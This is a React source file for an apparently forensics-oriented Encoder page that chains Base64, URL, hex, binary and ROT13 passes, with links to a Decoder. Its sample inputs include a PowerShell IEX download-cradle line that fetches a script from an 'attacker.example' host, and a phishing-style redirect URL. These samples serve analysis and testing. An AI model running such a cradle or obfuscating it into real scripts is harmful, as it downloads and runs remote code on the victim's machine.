import { useEffect, useMemo, useRef, useState } from 'react';
import { Link, useNavigate, useSearchParams } from 'react-router-dom';
import { BackLink } from '../../components/BackLink';
import { ArrowLeft, ArrowRight, Plus, Type, X, RotateCw } from 'lucide-react';
import { encodeChain, type Encoding } from '../../lib/dfir/encode';
import { CopyButton, CopyChip } from '../../components/dfir/CopyButton';

const ENCODINGS: { id: Encoding; label: string; blurb: string }[] = [
  { id: 'base64', label: 'Base64', blurb: 'Standard padded Base64 (RFC 4648)' },
  { id: 'urlsafe-base64', label: 'Base64 (URL-safe)', blurb: 'JWT-style: + → -, / → _, no = padding' },
  { id: 'url', label: 'URL-encode', blurb: 'percent-encode for query strings' },
  { id: 'hex', label: 'Hex', blurb: 'lowercase hex, no separator' },
  { id: 'binary', label: 'Binary', blurb: '8-bit groups separated by spaces' },
  { id: 'rot13', label: 'ROT13', blurb: 'A-Z / a-z rotated 13' },
];

const SAMPLES: { label: string; value: string }[] = [
  { label: 'IEX one-liner', value: "IEX(New-Object Net.WebClient).DownloadString('https://attacker.example/p.ps1')" },
  { label: 'phishing URL', value: 'https://login.example.com/auth?next=%2Fadmin&redirect=https://attacker.tld' },
  { label: 'JWT-style payload', value: '{"sub":"1234567890","name":"John Doe","iat":1516239022}' },
];

export default function Encoder(): JSX.Element {
  const [searchParams, setSearchParams] = useSearchParams();
  const navigate = useNavigate();
  const initialQ = searchParams.get('q') ?? '';
  const initialChainRaw = searchParams.get('chain') ?? 'base64';
  // Parse + validate the chain spec from the URL.
  const initialChain = initialChainRaw
    .split(',')
    .map((t) => t.trim() as Encoding)
    .filter((t) => ENCODINGS.some((e) => e.id === t));
  const [input, setInput] = useState(initialQ);
  const [chain, setChain] = useState<Encoding[]>(initialChain.length ? initialChain : ['base64']);
  const autoRan = useRef(false);

  // Keep the URL in sync with input + chain so a result is shareable.
  useEffect(() => {
    setSearchParams(
      (prev) => {
        const out = new URLSearchParams(prev);
        if (input.trim()) out.set('q', input.trim());
        else out.delete('q');
        out.set('chain', chain.join(','));
        return out;
      },
      { replace: true }
    );
  }, [input, chain, setSearchParams]);

  // Mark "auto-ran on URL prefill" — purely informational; encoding is
  // synchronous so the result renders immediately on first paint.
  useEffect(() => {
    if (!autoRan.current && initialQ) autoRan.current = true;
  }, [initialQ]);

  const steps = useMemo(() => (input.trim() ? encodeChain(input, chain) : []), [input, chain]);
  const finalOutput = steps.length > 0 ? (steps[steps.length - 1]?.after ?? '') : '';

  const addStep = () => setChain((prev) => [...prev, 'base64']);
  const removeStep = (idx: number) => setChain((prev) => (prev.length === 1 ? prev : prev.filter((_, i) => i !== idx)));
  const setStep = (idx: number, e: Encoding) => setChain((prev) => prev.map((x, i) => (i === idx ? e : x)));
  const reset = () => {
    setInput('');
    setChain(['base64']);
  };

  // Pipe the current encoded result into Decoder for a round-trip check.
  const sendToDecoder = () => {
    if (!finalOutput) return;
    navigate(`/dfir/decode?q=${encodeURIComponent(finalOutput)}`);
  };

  return (
    <div className="max-w-5xl mx-auto px-4 sm:px-8 py-12 text-slate-900 dark:text-slate-100">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-muted hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        <ArrowLeft size={14} /> back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-semibold mb-2 flex items-center gap-3">
          <Type size={28} className="text-brand-600 dark:text-brand-400" /> Encoder
        </h1>
        <p className="text-muted mb-2 max-w-3xl leading-relaxed">
          Multi-pass encoder. Counterpart to{' '}
          <Link to="/dfir/decode" className="text-brand-600 dark:text-brand-400 hover:underline">
            Decoder
          </Link>
          . Useful for crafting test payloads, replicating attacker obfuscation chains, and quickly producing
          base64/url/hex/binary/rot13 forms. Pure client-side; nothing leaves your browser.
        </p>
        <p className="text-xs text-slate-500 dark:text-slate-400 font-mono mb-8">
          Chains apply left-to-right: <code>url → base64</code> first URL-encodes the input, then base64-encodes the
          URL-encoded form. Use the round-trip button to verify the chain decodes cleanly.
        </p>
      </div>

      {/* Input */}
      <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
        <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
          <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono">
            Input
          </h2>
          <div className="flex flex-wrap gap-1.5">
            {SAMPLES.map((s) => (
              <button
                key={s.label}
                type="button"
                onClick={() => setInput(s.value)}
                className="text-mini font-mono px-2 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
              >
                {s.label}
              </button>
            ))}
            {(input || chain.length > 1) && (
              <button
                type="button"
                onClick={reset}
                className="text-mini font-mono px-2 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-rose-500/40 hover:text-rose-600 dark:hover:text-rose-400 inline-flex items-center gap-1"
              >
                <RotateCw size={11} /> reset
              </button>
            )}
          </div>
        </div>
        <textarea
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="Plain text, JSON, command-line, URL. Anything you want to encode."
          rows={6}
          className="w-full px-3 py-2 bg-slate-50 dark:bg-[rgb(var(--input-200))] border border-slate-200 dark:border-[rgb(var(--border-400))] rounded font-mono text-xs text-slate-900 dark:text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-brand-500 dark:focus:border-brand-400"
          spellCheck={false}
        />
      </section>

      {/* Chain builder */}
      <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
        <div className="flex items-center justify-between mb-3">
          <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono">
            Encoding chain ({chain.length})
          </h2>
          <button
            type="button"
            onClick={addStep}
            className="text-mini font-mono px-2 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-brand-500/40 inline-flex items-center gap-1"
          >
            <Plus size={11} /> add pass
          </button>
        </div>
        <div className="flex flex-wrap items-center gap-2">
          {chain.map((enc, idx) => (
            <div key={idx} className="inline-flex items-center gap-1">
              <select
                value={enc}
                onChange={(e) => setStep(idx, e.target.value as Encoding)}
                className="text-xs font-mono px-2 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--input-200))] focus:border-brand-500/60 focus:outline-none"
                title={ENCODINGS.find((e) => e.id === enc)?.blurb}
              >
                {ENCODINGS.map((opt) => (
                  <option key={opt.id} value={opt.id}>
                    {opt.label}
                  </option>
                ))}
              </select>
              {chain.length > 1 && (
                <button
                  type="button"
                  onClick={() => removeStep(idx)}
                  className="p-1 rounded text-slate-400 hover:text-rose-600 dark:hover:text-rose-400"
                  aria-label="remove pass"
                >
                  <X size={11} />
                </button>
              )}
              {idx < chain.length - 1 && <ArrowRight size={12} className="text-slate-400" aria-hidden="true" />}
            </div>
          ))}
        </div>
      </section>

      {/* Final output */}
      {finalOutput && (
        <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
          <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
            <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono">
              Final output
            </h2>
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={sendToDecoder}
                className="inline-flex items-center gap-1.5 text-mini font-mono px-2 py-1 rounded border border-brand-500/40 bg-brand-500/10 text-brand-700 dark:text-brand-300 hover:bg-brand-500/20"
                title="Round-trip: decode this back via /dfir/decode"
              >
                <ArrowRight size={11} /> round-trip in Decoder
              </button>
              <CopyButton value={finalOutput} />
            </div>
          </div>
          <pre className="text-xs font-mono text-slate-900 dark:text-slate-100 whitespace-pre-wrap break-all bg-slate-50 dark:bg-[rgb(var(--input-200))] rounded p-3 border border-slate-200 dark:border-[rgb(var(--border-400))] max-h-80 overflow-auto">
            {finalOutput}
          </pre>
        </section>
      )}

      {/* Per-pass breakdown */}
      {steps.length > 1 && (
        <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4 mb-6">
          <h2 className="text-eyebrow font-mono uppercase tracking-[0.2em] text-slate-500 dark:text-slate-400 font-mono mb-3">
            Per-pass breakdown
          </h2>
          <ol className="space-y-3">
            {steps.map((step, i) => (
              <li
                key={i}
                className="rounded border border-slate-200 dark:border-[rgb(var(--border-400))] bg-slate-50 dark:bg-[rgb(var(--input-200))] p-3"
              >
                <div className="flex items-baseline justify-between gap-2 mb-2">
                  <span className="text-mini font-mono text-slate-400 dark:text-slate-400">
                    pass {i + 1} ·{' '}
                    <span className="text-slate-700 dark:text-slate-300">
                      {ENCODINGS.find((e) => e.id === step.encoding)?.label}
                    </span>
                  </span>
                  <CopyChip value={step.after} />
                </div>
                <pre className="text-mini font-mono text-slate-700 dark:text-slate-300 whitespace-pre-wrap break-all max-h-32 overflow-auto">
                  {step.after}
                </pre>
              </li>
            ))}
          </ol>
        </section>
      )}
    </div>
  );
}
